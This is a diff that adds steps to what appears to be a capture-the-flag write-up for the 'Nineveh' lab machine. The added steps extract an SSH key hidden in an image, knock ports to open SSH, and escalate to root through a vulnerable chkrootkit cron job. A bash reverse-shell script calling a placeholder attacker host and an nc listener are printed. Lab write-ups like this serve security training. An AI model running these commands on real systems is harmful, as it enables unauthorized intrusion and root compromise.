@@ -175,6 +175,18 @@ uname -a
 cat /etc/*-release
 ```
 
+Possible private SSH keys were found with linPEAS:
+
+```
+strings /var/www/ssl/secure_notes/nineveh.png
+```
+
+The RSA private key was saved as `id_rsa` and permissions were changed:
+
+```
+chmod 600 id_rsa
+```
+
 ### Port Knocking Discovery
 
 Running processes were inspected, revealing a running `knockd` service:
@@ -193,6 +205,44 @@ knock -v 10.129.186.238 571 290 911 -d 500
 
 After knocking, SSH (port 22) became accessible.
 
+### SSH Access
+
+An SSH private key extracted earlier was used to authenticate as user `amrois` on port 22:
+
+```
+ssh amrois@10.129.186.238 -i id_rsa
+```
+
+### Root Privilege Escalation
+
+Process monitoring was performed with `pspy` and revealed a cron job executing `chkrootkit`:
+
+```
+./pspy64
+```
+
+The installed `chkrootkit` version was vulnerable to local privilege escalation. A malicious script was created as `/tmp/update` to spawn a root reverse shell:
+
+```
+#!/bin/bash
+
+bash -i >& /dev/tcp/<attacker-ip>/1337 0>&1
+```
+
+The `update` file was made executable:
+
+```
+chmod +x /tmp/update
+```
+
+A listener was started:
+
+```
+nc -lnvp 1337
+```
+
+Resulting in a root shell.
+
 ---
 
 ## 9. Proof of Compromise
@@ -207,3 +257,6 @@ After knocking, SSH (port 22) became accessible.
 
 phpLiteAdmin <= 1.9.3 - PHP Remote Code Execution:
 [https://www.exploit-db.com/exploits/24044](https://www.exploit-db.com/exploits/24044)
+
+Chkrootkit 0.49 - Local Privilege Escalation:
+[https://www.exploit-db.com/exploits/33899](https://www.exploit-db.com/exploits/33899)
